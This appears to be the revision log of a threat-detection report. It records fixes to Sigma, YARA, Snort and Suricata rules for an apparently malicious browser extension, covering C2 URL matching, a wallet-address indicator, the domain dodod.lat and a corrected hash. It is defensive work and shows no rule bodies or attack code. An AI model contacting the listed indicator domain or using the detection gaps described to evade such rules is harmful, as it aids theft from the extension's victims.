<!-- revision: v2.0 2026-06-21 REVISED. Applied all critic fixes. Changes: (1) Sigma 1: removed product:windows, require selection_c2_url in all branches. (2) Sigma 2: replaced c-useragent with r-dns, added wallet address IOC anchor, aligned level:low with confidence:low. (3) Sigma 3: no changes. (4) Sigma 4 DROPPED: WASM file event matched any legitimate WASM-bundling extension. (5) YARA 1: documented ChaCha20 encryption vs plaintext string contradiction. (6) YARA 2: corrected SHA256 hash from 70-char malformed to correct 64-char value (3aa31999...f9e5d58); removed nocase from extension name strings. (7) YARA 3: lowered severity from medium to low; added WASM-structural note. (8) Snort SIDs 2026062102-04: added dodod.lat domain anchor. (9) Suricata SIDs 2026062202-04: added dodod.lat domain anchor. (10) IOC table: corrected malformed SHA256 hash. Final: 3 Sigma, 3 YARA, 5 Snort, 6 Suricata rules. All re-validated (sigma check, yarac, snort -T, suricata -T). -->

---
*Report generated by Actioner*
